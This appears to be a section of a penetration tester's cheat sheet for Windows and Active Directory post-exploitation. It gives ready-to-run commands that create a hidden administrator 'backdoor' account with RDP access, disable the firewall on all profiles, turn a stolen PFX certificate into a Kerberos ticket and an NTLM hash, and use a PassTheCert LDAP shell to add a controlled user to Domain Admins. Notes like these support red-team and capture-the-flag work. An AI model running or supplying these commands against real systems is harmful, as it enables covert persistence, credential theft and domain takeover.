
### RDP

Add backdoored user & enable RDP
```bash
net user /add backdoor Password123! && net localgroup administrators backdoor /add & net localgroup "Remote Desktop Users" backdoor /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v backdoor /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto
```

RDP with clipboard & shared folder:
```bash
xfreerdp +clipboard /u:<username> /p:<password> /v:<hostname> /drive:/path/to/local/folder,ShareName
```


### Disable firewall

```bash
netsh advfirewall set allprofiles state off
```


### Clock skew error

```bash
sudo apt-get install rdate
sudo rdate -n <DC-IP>
```


### PFX to evil-winrm
- https://notes.shashwatshah.me/windows/active-directory/winrm-using-certificate-pfx

Get TGT: (pfx2john if necessary)
```bash
python3 gettgtpkinit.py -cert-pfx <file>.pfx -pfx-pass <pass> <domain>/<user> user.ccache -dc-ip <IP>
```

Get NTLM hash:
```bash
export KRB5CCNAME=user.ccache 

python3 getnthash.py -key <key> <domain>/<user> -dc-ip <IP>
```

Ldapshell approach:
- https://github.com/AlmondOffSec/PassTheCert/tree/main/Python
```bash
# Split pfx file
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
certipy-ad cert -pfx administrator.pfx -nocert -out user.key

# Pass the cert to get ldap shell
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain <domain> -dc-ip <IP>

# Add controlled user to admin group
add_user_to_group <controlled-user> Administrators
add_user_to_group <controlled-user> "Domain Admins"
```
